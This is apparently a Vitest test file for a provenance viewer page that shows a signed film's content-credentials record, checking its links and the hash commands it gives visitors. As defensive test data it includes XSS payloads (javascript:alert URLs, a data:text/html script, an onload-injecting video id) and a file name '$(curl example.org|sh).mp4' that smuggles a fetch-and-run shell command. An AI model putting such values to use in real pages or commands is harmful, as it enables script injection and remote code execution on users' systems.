// Runs viewer.js itself, against a stand-in for the browser, and reads what
// it drew: the links it made and the words it used (D71). model.test.js
// covers each check on its own; this shows the page uses them.
import { describe, it, expect, afterEach } from "vitest";
import { readFileSync } from "node:fs";
import path from "node:path";
import { installTinyDom } from "./helpers/tiny-dom.js";
import { mountViewer } from "../../../public-viewer/src/viewer.js";
import { RECORD_NOTE } from "../../../public-viewer/src/model.js";

const ROOT = path.resolve(import.meta.dirname, "..", "..", "..");
const example = () =>
	JSON.parse(
		readFileSync(
			path.join(ROOT, "public-viewer/example/example.provenance.json"),
			"utf8",
		),
	);
const PAGE = "https://example.org/films/morning-market";

let dom;
afterEach(() => dom?.restore());

async function draw(data, opts = {}) {
	dom = installTinyDom(PAGE);
	const viewer = await mountViewer(dom.root, { data, ...opts });
	const links = dom.root.querySelectorAll("a").map((a) => a.href);
	return { viewer, root: dom.root, links, text: dom.root.textContent };
}

describe("the viewer, drawn", () => {
	it("draws the example, and says the signature results are the record's account", async () => {
		const { viewer, text, links, root } = await draw(example());
		expect(viewer).not.toBeNull();
		expect(text).toContain("A Morning at the Market");
		expect(text).toContain(RECORD_NOTE);
		expect(text).toContain("Recorded as sound");
		// "Checks out" is kept for a check the page makes on a visitor's copy.
		expect(text).not.toContain("Checks out");
		expect(text).toContain("The record names Example Studio");
		// The certificate the record names, by its fingerprint (D72).
		expect(text).toContain("Signing certificate");
		expect(text.replaceAll(" ", "")).toContain(
			example().signer.certificateSha256,
		);
		expect(links).toContain(
			"https://media.example.org/films/morning-market.signed.v1.mp4",
		);
		expect(links).toContain("https://contentcredentials.org/verify");
		// The example's own source types are linked.
		expect(
			links.filter((l) =>
				l.startsWith("http://cv.iptc.org/newscodes/digitalsourcetype/"),
			).length,
		).toBeGreaterThan(0);
		expect(text).toContain(
			'certutil -hashfile "morning-market.signed.v1.mp4" SHA256',
		);
		// The clock, with no video given.
		expect(root.querySelector(".ptv-clock")).not.toBeNull();
	});

	it("makes no link out of an address that is not one, wherever it comes from", async () => {
		const hostile = example();
		for (const i of hostile.ingredients)
			i.digitalSourceType = "javascript:alert(document.domain)";
		hostile.signedFile.url = "javascript:alert(1)";
		hostile.page.url = "data:text/html,<script>alert(1)</script>";
		const { links, text } = await draw(hostile, {
			download: { url: "javascript:alert(2)" },
			verifyUrl: "javascript:alert(3)",
			video: { youtubeId: 'x" onload="alert(4)', src: "javascript:alert(5)" },
		});
		expect(links.length).toBeGreaterThan(0);
		for (const link of links) expect(link).toMatch(/^https:\/\//);
		// The independent viewer falls back to the usual one.
		expect(links).toContain("https://contentcredentials.org/verify");
		// With no download address left, the page says so instead of linking.
		expect(
			dom.root.querySelectorAll(".ptv-button").filter((b) => b.tagName === "A"),
		).toEqual([]);
		// A video id that is not one: the clock plays, and YouTube is not loaded.
		expect(dom.root.querySelector(".ptv-clock")).not.toBeNull();
		expect(dom.head.children).toEqual([]);
		expect(text).not.toContain("streams from YouTube");
	});

	it("takes the page's own download link when it is one", async () => {
		const { links } = await draw(example(), {
			download: { url: "/files/film.signed.mp4" },
		});
		expect(links).toContain("https://example.org/files/film.signed.mp4");
	});

	it("does not put an odd file name into the commands a visitor is told to paste", async () => {
		const odd = example();
		odd.signedFile.fileName = "$(curl example.org|sh).mp4";
		const { text } = await draw(odd);
		expect(text).toContain(
			"certutil -hashfile <the file you downloaded> SHA256",
		);
		expect(text).toContain("shasum -a 256 <the file you downloaded>");
		expect(text).not.toContain('"$(curl');
		expect(text).toContain("Put the name of the file you downloaded");
	});

	it("shows an error in words, and draws nothing, for an export it cannot show", async () => {
		const endless = example();
		endless.film.durationSeconds = Infinity;
		const { viewer, root, text } = await draw(endless);
		expect(viewer).toBeNull();
		expect(text).toMatch(/length is not a number of seconds/);
		expect(root.children.length).toBe(1);
		expect(root.children[0].getAttribute("role")).toBe("alert");
	});
});
